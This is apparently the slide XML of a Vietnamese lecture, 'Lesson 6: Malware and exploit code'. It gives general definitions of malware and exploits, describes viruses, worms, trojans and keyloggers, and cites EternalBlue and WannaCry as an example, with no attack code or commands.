                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Tahoma"/>
                <a:cs typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="Tahoma"/>
              <a:cs typeface="Tahoma"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="136313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4991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451614" y="514297"/>
            <a:ext cx="8622193" cy="479619"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BÀI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> 6: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MÃ</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ĐỘC</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VÀ</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MÃ</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KHAI</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THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800"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450376" y="1181421"/>
            <a:ext cx="8792340" cy="4228811"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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Khái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niệm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loại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ã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độc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phổ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p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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Quy</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bằng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Exploit code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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Kỹ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thuật phát tán &amp; che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giấu</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p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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ệ</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p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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Biện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pháp phòng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chống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p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>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lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="13" name="Group 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9C15E21A-C111-4D39-BB47-E83988E5A05E}"/>
              </a:ext>
              <a:ext uri="{C183D7F6-B498-43B3-948B-1728B52AA6E4}">
                <adec:decorative xmlns:adec="http://schemas.microsoft.com/office/drawing/2017/decorative" xmlns="" val="1"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9055676" y="0"/>
            <a:ext cx="3193475" cy="6954260"/>
            <a:chOff x="9055676" y="0"/>
            <a:chExt cx="3193475" cy="6954260"/>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2" name="Graphic 11" descr="Test tubes">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57BD2CFA-105C-4606-859E-A8413C62B3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450534" y="4155643"/>
              <a:ext cx="2798617" cy="2798617"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="What is cyber security? | Wizard Cyb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0534" y="0"/>
            <a:ext cx="2676256" cy="22008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0" y="109017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002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05445"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.1.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Khái niệm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34296"/>
            <a:ext cx="10556543" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>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1. Mã độc (Malware)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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Malware là phần mềm hoặc đoạn mã độc hại được tạo ra nhằm gây hại cho hệ thống máy tính, đánh cắp dữ liệu, gián điệp người dùng hoặc làm gián đoạn hoạt động.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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Đặc điểm:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Hoạt động bí mật, khó phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Có khả năng tự lây lan hoặc ẩn mình dưới dạng phần mềm hợp pháp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Gây hậu quả từ nhẹ (giảm hiệu năng) đến nghiêm trọng (mất dữ liệu, mất quyền kiểm soát hệ thống).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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loại phổ biến:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Virus: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ự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chèn vào tệp tin, lây lan khi tệp bị mở.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Worm: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ự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nhân bản và phát tán qua mạng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="3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Trojan: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iả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dạng phần mềm hữu ích để cài vào máy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="300"/>
              </a:spcBef>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Spyware/Keylogger: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heo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dõi, ghi lại hoạt động người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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7851292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05445"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.1.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Khái niệm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34296"/>
            <a:ext cx="10556543"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2</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Mã khai thác (Exploit Code)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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Exploit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là đoạn mã hoặc tập hợp lệnh lợi dụng một lỗ hổng bảo mật trong phần mềm, hệ điều hành hoặc dịch vụ để thực thi hành vi trái phép.</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Thực thi mã tùy ý trên hệ thống mục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tiêu</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Leo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thang đặc quyền (Privilege Escalation</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Vượt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qua cơ chế bảo mật (sandbox, DEP, ASLR).</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Đặc điểm:</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phải lúc nào cũng là “mã độc”; một số exploit được dùng trong kiểm thử xâm nhập (pentest) hợp pháp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>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Thường kết hợp với malware để phát tán hoặc điều khiển hệ thống sau khi chiếm quyền.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Exploit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EternalBlue (2017) lợi dụng lỗ hổng SMBv1 của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Windows</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nhóm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WannaCry ransomware khai thác, gây lây nhiễm toàn cầu</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9347895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53487" y="887582"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>.1.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Khái niệm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53487" y="1525616"/>
            <a:ext cx="10556543" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="28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endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="28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Malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>là</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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vi-VN" sz="28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ông </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>cụ gây hại trực tiếp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="28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Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>xem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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800" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>như</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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vi-VN" sz="28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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>chìa khóa” mở cửa, lợi dụng lỗ hổng để đưa malware hoặc lệnh độc vào hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Cả hai thường đi đôi: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800"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Exploit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="Segoe UI Emoji" panose="020B0502040204020203" pitchFamily="34" charset="0"/>
                <a:cs typeface="Tahoma" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>giúp mở đường, Malware thực hiện phá hoại.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39337103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78150"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ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07001"/>
            <a:ext cx="10133463" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> Malware:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="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Virus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lây lan bằng cách gắn vào file hoặc chương trình hợp pháp.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Kích hoạt khi người dùng chạy chương trình bị nhiễm.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tác hại: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>P</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>há </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>hỏng dữ liệu, làm chậm hệ thống, gây lỗi ứng dụng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Worm </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>(Sâu máy tính)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tự lây lan qua mạng mà không cần sự can thiệp của người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lợi dụng lỗ hổng bảo mật để phát tán.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Có thể gây nghẽn mạng, tấn công diện rộng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Trojan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Horse (Ngựa thành Troy)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Giả dạng phần mềm hữu ích nhưng chứa mã độc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Cho phép hacker điều khiển hệ thống từ xa.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thường dùng để mở “cửa hậu” (backdoor) hoặc đánh cắp thông tin.</a:t>
            </a:r>
          </a:p>
          <a:p>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9044570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78149"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ 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07000"/>
            <a:ext cx="10406419" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
